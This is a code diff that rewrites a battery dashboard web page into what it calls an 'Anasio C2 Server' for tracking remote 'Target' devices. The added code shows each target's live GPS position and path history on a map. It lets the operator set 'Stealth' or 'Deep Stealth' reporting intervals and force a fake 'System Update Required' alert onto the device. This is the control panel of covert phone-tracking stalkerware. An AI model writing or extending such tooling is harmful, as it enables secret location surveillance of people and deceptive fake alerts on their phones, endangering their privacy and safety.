@@ -3,129 +3,342 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Anasio | Battery Telemetry</title>
+    <title>Anasio | Command & Control</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Leaflet CSS for Map -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" crossorigin=""/>
     <meta name="theme-color" content="#ffffff">
     <style>
-        /* small battery bar styling */
         .battery {
-            width: 160px;
-            height: 28px;
-            border-radius: 8px;
+            width: 140px;
+            height: 26px;
+            border-radius: 6px;
             border: 2px solid #e5e7eb;
             position: relative;
             background: #fff;
         }
         .battery-level {
             height: 100%;
-            border-radius: 6px;
+            border-radius: 4px;
             transition: width 400ms ease, background 400ms ease;
         }
         .battery-tip {
             position: absolute;
-            right: -10px;
-            top: 6px;
-            width: 6px;
-            height: 16px;
+            right: -8px;
+            top: 5px;
+            width: 5px;
+            height: 12px;
             background: #e5e7eb;
             border-radius: 2px;
         }
+        #map {
+            height: 400px;
+            border-radius: 1rem;
+            z-index: 10;
+        }
     </style>
 </head>
-<body class="bg-gray-50 text-gray-900 font-sans">
-    <div class="max-w-2xl mx-auto py-16 px-6">
-        <header class="mb-8">
-            <h1 class="text-4xl font-bold tracking-tight">Device Status</h1>
-            <p class="text-gray-500 mt-2">Real-time telemetry dashboard</p>
-        </header>
-
-        <div class="bg-white rounded-3xl p-8 shadow-sm border border-gray-100">
-            <div class="flex items-center justify-between gap-4">
+<body class="bg-gray-100 text-gray-900 font-sans min-h-screen">
+    <div class="max-w-6xl mx-auto py-8 px-4 sm:px-6">
+        
+        <!-- Top Navigation Bar -->
+        <nav class="mb-8 flex flex-col md:flex-row justify-between items-center bg-white p-4 rounded-2xl shadow-sm border border-gray-200">
+            <div class="flex items-center gap-4 mb-4 md:mb-0">
+                <div class="bg-blue-600 text-white p-2 rounded-lg">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m18-6h-2m2 6h-2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2zM9 9h6v6H9V9z"></path></svg>
+                </div>
                 <div>
-                    <p class="text-sm font-medium text-gray-400 uppercase tracking-widest">Battery Level</p>
-                    <p id="level-text" class="text-6xl font-bold mt-2">--%</p>
-                </div>
-
-                <div class="flex flex-col items-end gap-3">
-                    <div class="battery" aria-hidden>
-                        <div id="battery-fill" class="battery-level" style="width:0%"></div>
-                        <div class="battery-tip"></div>
-                    </div>
-                    <div id="status-dot" class="flex items-center text-sm text-gray-400">
-                        <span id="dot" class="h-2 w-2 bg-gray-300 rounded-full mr-2"></span>
-                        <span id="status-text">Offline</span>
-                    </div>
+                    <h1 class="text-xl font-bold tracking-tight text-gray-900">Anasio C2 Server</h1>
+                    <p class="text-xs text-gray-500 font-medium">Encrypted Telemetry Stream</p>
                 </div>
             </div>
+            
+            <div class="flex items-center gap-6">
+                <!-- Navigation -->
+                <a href="/history_view" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition tracking-wide uppercase">Location History</a>
 
-            <div class="mt-8 pt-8 border-t border-gray-50 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 text-sm text-gray-400">
-                <span>Last updated: <span id="timestamp">--:--:--</span></span>
+                <!-- Device Selector -->
+                <div class="flex items-center gap-2 bg-gray-50 px-3 py-2 rounded-xl border border-gray-200">
+                    <label class="text-xs font-bold text-gray-500 uppercase">Target:</label>
+                    <select id="device-select" class="bg-transparent font-semibold text-gray-800 text-sm focus:outline-none cursor-pointer">
+                        <option value="">Awaiting connection...</option>
+                    </select>
+                </div>
+                
+                <!-- Status Badge -->
+                <div class="flex items-center bg-gray-50 px-4 py-2 rounded-xl border border-gray-200">
+                    <span id="dot" class="h-2 w-2 bg-gray-300 rounded-full mr-2 shadow-sm"></span>
+                    <span id="status-text" class="text-xs font-bold tracking-wide text-gray-500 uppercase">Offline</span>
+                </div>
+                
+                <a href="/logout" class="text-xs font-bold bg-red-50 text-red-600 px-4 py-2 rounded-xl hover:bg-red-100 transition">Logout</a>
+            </div>
+        </nav>
 
-                <div class="flex items-center gap-4">
-                    <form id="post-form" class="flex items-center gap-2">
-                        <label for="level-input" class="sr-only">Level</label>
-                        <input id="level-input" type="number" min="0" max="100" placeholder="Level" class="px-3 py-2 border rounded-md w-24" />
-                        <button type="submit" class="bg-blue-600 text-white px-3 py-2 rounded-md">Send</button>
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            
+            <!-- Left Column: Metrics & Controls -->
+            <div class="flex flex-col gap-6 lg:col-span-1">
+                
+                <!-- Battery Card -->
+                <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
+                    <div class="flex items-center justify-between mb-6">
+                        <p class="text-xs font-bold text-gray-400 uppercase tracking-widest">Battery Status</p>
+                        <div class="battery" aria-hidden>
+                            <div id="battery-fill" class="battery-level" style="width:0%"></div>
+                            <div class="battery-tip"></div>
+                        </div>
+                    </div>
+                    <div class="text-center md:text-left">
+                        <p id="level-text" class="text-6xl font-black text-gray-800 tracking-tighter">--%</p>
+                        <p class="text-sm text-gray-500 mt-2 font-medium">Last Ping: <span id="timestamp" class="font-mono bg-gray-100 px-1.5 py-0.5 rounded text-gray-700">--:--:--</span></p>
+                    </div>
+                </div>
+
+                <!-- Activity Card -->
+                <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
+                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-4">Target Activity</p>
+                    <div class="flex items-center gap-4">
+                        <div class="bg-blue-50 p-3 rounded-full">
+                            <svg class="w-6 h-6 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+                        </div>
+                        <div>
+                            <p id="activity-text" class="text-lg font-bold text-gray-800">Analyzing...</p>
+                            <p id="coords-text" class="text-xs font-mono text-gray-500 mt-1">Acquiring GPS Lock</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- C2 Config Card -->
+                <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
+                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-4">Payload Configuration</p>
+                    <form id="interval-form" class="flex flex-col gap-3">
+                        <label class="text-xs font-medium text-gray-600">Reporting Frequency</label>
+                        <select id="interval-select" class="px-3 py-2.5 border border-gray-200 rounded-xl text-sm bg-gray-50 focus:ring-2 focus:ring-blue-500 outline-none w-full cursor-pointer">
+                            <option value="5">Every 5 Seconds (High Drain!)</option>
+                            <option value="60">Every 1 Minute (Balanced)</option>
+                            <option value="600">Every 10 Minutes (Stealth)</option>
+                            <option value="3600">Every 1 Hour (Deep Stealth)</option>
+                        </select>
+                        <button type="submit" class="w-full bg-gray-900 hover:bg-black text-white font-bold px-4 py-2.5 rounded-xl transition shadow-sm text-sm">Deploy Config to Target</button>
                     </form>
-
-                    <button id="refresh" class="text-sm text-gray-500 underline">Refresh Now</button>
                 </div>
+
+                <!-- Remote Notification Card -->
+                <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
+                    <div class="flex items-center justify-between mb-4">
+                        <p class="text-xs font-bold text-gray-400 uppercase tracking-widest">System Alert Override</p>
+                        <span id="notif-badge" class="bg-gray-100 text-gray-500 text-[10px] px-2 py-0.5 rounded-full font-bold uppercase tracking-wider">Inactive</span>
+                    </div>
+                    <form id="notif-form" class="flex flex-col gap-3">
+                        <input type="text" id="notif-message" placeholder="e.g. System Update Required..." class="px-3 py-2.5 border border-gray-200 rounded-xl text-sm bg-gray-50 focus:ring-2 focus:ring-blue-500 outline-none w-full" />
+                        <div class="flex gap-2">
+                            <button type="submit" class="flex-1 bg-red-600 hover:bg-red-700 text-white font-bold px-3 py-2 rounded-xl transition shadow-sm text-sm">Force Show</button>
+                            <button type="button" id="hide-notif-btn" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold px-3 py-2 rounded-xl transition shadow-sm text-sm">Revoke</button>
+                        </div>
+                    </form>
+                </div>
+                
             </div>
+
+            <!-- Right Column: Map -->
+            <div class="bg-white rounded-3xl p-2 shadow-sm border border-gray-200 lg:col-span-2 relative overflow-hidden flex flex-col">
+                <div class="absolute top-4 left-4 z-20 pointer-events-none">
+                    <div class="bg-white/95 backdrop-blur px-4 py-2 rounded-xl shadow-sm border border-gray-200 pointer-events-auto">
+                        <p class="text-xs font-bold text-gray-800 uppercase tracking-widest flex items-center gap-2">
+                            <span class="relative flex h-2 w-2">
+                              <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-400 opacity-75"></span>
+                              <span class="relative inline-flex rounded-full h-2 w-2 bg-blue-500"></span>
+                            </span>
+                            Live Tracker
+                        </p>
+                    </div>
+                </div>
+                <!-- Map Container -->
+                <div id="map" class="w-full flex-grow"></div>
+            </div>
+            
         </div>
     </div>
 
+    <!-- Leaflet JS -->
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" crossorigin=""></script>
     <script>
         const levelText = document.getElementById('level-text');
         const batteryFill = document.getElementById('battery-fill');
         const timestampEl = document.getElementById('timestamp');
         const statusDot = document.getElementById('dot');
         const statusText = document.getElementById('status-text');
+        const coordsText = document.getElementById('coords-text');
+        const activityText = document.getElementById('activity-text');
+        const selectEl = document.getElementById('device-select');
+
+        // Initialize Map
+        const map = L.map('map', {zoomControl: false}).setView([0, 0], 2);
+        L.control.zoom({ position: 'bottomright' }).addTo(map);
+
+        L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png', {
+            attribution: '&copy; OpenStreetMap contributors &copy; CARTO',
+            maxZoom: 20
+        }).addTo(map);
+
+        const customIcon = L.divIcon({
+            className: 'custom-icon',
+            html: `<div class="bg-blue-600 rounded-full w-4 h-4 shadow-[0_0_15px_rgba(37,99,235,0.7)] border-2 border-white ring-4 ring-blue-500/20"></div>`,
+            iconSize: [24, 24],
+            iconAnchor: [12, 12]
+        });
+
+        let marker = L.marker([0, 0], {icon: customIcon}).addTo(map);
+        let pathLine = L.polyline([], {color: '#ef4444', weight: 3, opacity: 0.8, dashArray: '5, 8', lineJoin: 'round'}).addTo(map);
+        let hasLocation = false;
 
         function colorForLevel(n){
-            if(n >= 80) return '#16a34a';
-            if(n >= 40) return '#f59e0b';
-            return '#ef4444';
+            if(n >= 70) return '#16a34a'; // Green
+            if(n >= 25) return '#f59e0b'; // Yellow
+            return '#dc2626'; // Red
+        }
+
+        async function fetchAvailableDevices() {
+            try {
+                const devRes = await fetch('/devices');
+                const devData = await devRes.json();
+                const currentSelected = selectEl.value;
+                
+                if (devData.devices && devData.devices.length > 0) {
+                    if (selectEl.options[0].value === "") { selectEl.innerHTML = ''; }
+                    
+                    devData.devices.forEach(did => {
+                        if (!Array.from(selectEl.options).some(opt => opt.value === did)) {
+                            const opt = document.createElement('option');
+                            opt.value = did; opt.textContent = did;
+                            selectEl.appendChild(opt);
+                        }
+                    });
+                    
+                    if (!currentSelected && selectEl.options.length > 0) {
+                        selectEl.value = selectEl.options[0].value;
+                    }
+                }
+            } catch(err) { console.error("Device fetch error", err); }
         }
 
         async function fetchStats(){
-            try{
-                const res = await fetch('/stats');
+            await fetchAvailableDevices();
+            try {
+                const activeDevice = selectEl.value;
+                const statsUrl = activeDevice ? `/stats?device_id=${encodeURIComponent(activeDevice)}` : '/stats';
+                const res = await fetch(statsUrl);
                 if(!res.ok) throw new Error('no stats');
                 const data = await res.json();
-                const n = parseInt(data.level || 0, 10);
-                levelText.textContent = n + '%';
-                batteryFill.style.width = Math.max(0, Math.min(100, n)) + '%';
-                const c = colorForLevel(n);
-                batteryFill.style.background = c;
-                timestampEl.textContent = data.timestamp || '--:--:--';
-                statusDot.style.background = '#10b981';
-                statusText.textContent = 'System Online';
-            }catch(e){
-                statusDot.style.background = '#9ca3af';
-                statusText.textContent = 'Offline';
+                
+                if(data.level && data.timestamp !== "Waiting for devices...") {
+                    // Update Battery View
+                    const n = parseInt(data.level || 0, 10);
+                    levelText.textContent = n + '%';
+                    batteryFill.style.width = Math.max(0, Math.min(100, n)) + '%';
+                    batteryFill.style.background = colorForLevel(n);
+                    timestampEl.textContent = data.timestamp;
+                    activityText.textContent = data.activity || 'Stationary';
+                    
+                    statusDot.className = "h-2 w-2 bg-green-500 rounded-full mr-2 shadow-[0_0_8px_rgba(34,197,94,0.8)] animate-pulse";
+                    statusText.textContent = 'Online';
+                    statusText.className = "text-xs font-bold tracking-wide text-green-600 uppercase";
+
+                    if(data.ping_interval) {
+                        document.getElementById('interval-select').value = data.ping_interval;
+                    }
+
+                    // Notification State Logic
+                    if(data.notif_state === 1) {
+                        document.getElementById('notif-badge').className = "bg-red-100 text-red-600 text-[10px] px-2 py-0.5 rounded-full font-bold uppercase tracking-wider";
+                        document.getElementById('notif-badge').textContent = "Active";
+                        const notifInput = document.getElementById('notif-message');
+                        // Only auto-fill if the user isn't actively typing
+                        if(document.activeElement !== notifInput) {
+                            notifInput.value = data.notif_text || "";
+                        }
+                    } else {
+                        document.getElementById('notif-badge').className = "bg-gray-100 text-gray-500 text-[10px] px-2 py-0.5 rounded-full font-bold uppercase tracking-wider";
+                        document.getElementById('notif-badge').textContent = "Inactive";
+                    }
+
+                    // Map Logic
+                    if(data.lat && data.lon) {
+                        const lat = parseFloat(data.lat);
+                        const lon = parseFloat(data.lon);
+                        const newLatLng = new L.LatLng(lat, lon);
+                        marker.setLatLng(newLatLng);
+                        
+                        const histRes = await fetch(`/history?device_id=${encodeURIComponent(activeDevice)}`);
+                        if(histRes.ok) {
+                            const histData = await histRes.json();
+                            if(histData.path && histData.path.length > 0) {
+                                pathLine.setLatLngs(histData.path);
+                            }
+                        }
+
+                        if(!hasLocation) {
+                            map.flyTo(newLatLng, 15, { duration: 1.5 });
+                            hasLocation = true;
+                        }
+                        coordsText.textContent = `${lat.toFixed(5)}°, ${lon.toFixed(5)}°`;
+                    }
+                }
+            } catch(e) {
+                statusDot.className = "h-2 w-2 bg-red-500 rounded-full mr-2 shadow-sm";
+                statusText.textContent = 'Disconnected';
+                statusText.className = "text-xs font-bold tracking-wide text-red-600 uppercase";
             }
         }
 
-        // Poll every 5 seconds
         fetchStats();
-        const poll = setInterval(fetchStats, 5000);
+        setInterval(fetchStats, 5000);
+        selectEl.addEventListener('change', () => { hasLocation = false; fetchStats(); });
 
-        document.getElementById('refresh').addEventListener('click', (e)=>{ e.preventDefault(); fetchStats(); });
-
-        // simple test form that POSTs form-encoded data
-        document.getElementById('post-form').addEventListener('submit', async (e)=>{
+        document.getElementById('interval-form').addEventListener('submit', async (e) => {
             e.preventDefault();
-            const val = document.getElementById('level-input').value;
-            if(!val && val !== '0') return;
-            try{
+            const val = document.getElementById('interval-select').value;
+            const activeDevice = selectEl.value;
+            if(!activeDevice) return alert("Wait for a device to connect first.");
+            
+            try {
                 const fd = new FormData();
-                fd.append('level', String(val));
-                await fetch('/battery_report', { method: 'POST', body: fd });
-                document.getElementById('level-input').value = '';
-                fetchStats();
-            }catch(err){
+                fd.append('device_id', activeDevice);
+                fd.append('interval', val);
+                await fetch('/set_interval', { method: 'POST', body: fd });
+                alert(`SUCCESS: Payload configuration queued.\n\nThe target device will switch to reporting every ${val} seconds on its next ping.`);
+            } catch(err) {
                 console.error(err);
             }
+        });
+
+        // Remote Notification Command Logic
+        async function setNotificationCmd(state, text) {
+            const activeDevice = selectEl.value;
+            if(!activeDevice) return alert("Wait for a device to connect first.");
+            try {
+                const fd = new FormData();
+                fd.append('device_id', activeDevice);
+                fd.append('state', state);
+                fd.append('text', text);
+                await fetch('/set_notification', { method: 'POST', body: fd });
+                alert(state === 1 ? "Notification command activated." : "Notification revoked.");
+                fetchStats();
+            } catch(err) {
+                console.error(err);
+            }
+        }
+
+        document.getElementById('notif-form').addEventListener('submit', (e) => {
+            e.preventDefault();
+            const text = document.getElementById('notif-message').value;
+            setNotificationCmd(1, text || "System Alert");
+        });
+
+        document.getElementById('hide-notif-btn').addEventListener('click', () => {
+            document.getElementById('notif-message').value = "";
+            setNotificationCmd(0, "");
         });
     </script>
 </body>
